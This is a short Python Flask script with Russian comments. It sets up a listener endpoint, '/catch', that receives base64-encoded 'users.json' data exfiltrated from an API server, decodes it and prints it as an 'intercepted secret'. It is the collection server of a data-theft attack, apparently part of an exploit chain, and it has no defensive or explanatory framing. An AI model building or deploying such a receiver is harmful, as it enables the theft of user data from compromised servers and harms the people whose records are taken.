from flask import Flask, request, jsonify
import base64

app = Flask(__name__)

@app.route('/catch', methods=['POST'])
def catch_secret():
    try:
        secret_data = request.get_json()
        if not secret_data or 'data' not in secret_data:
            print("[!] Получен пустой запрос или неверный формат")
            return jsonify({"status": "bad_request"}), 400
            
        encoded_users = secret_data['data']['users.json']
        decoded_users = base64.b64decode(encoded_users).decode('utf-8')
        
        print("\n" + "="*50)
        print("[!!!] УСПЕШНО ПЕРЕХВАЧЕН СЕКРЕТ ИЗ API-СЕРВЕРА:")
        print(decoded_users)
        print("="*50 + "\n")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"[!] Ошибка парсинга: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    # Слушаем все интерфейсы на порту 5000
    app.run(host='0.0.0.0', port=5000, debug=False)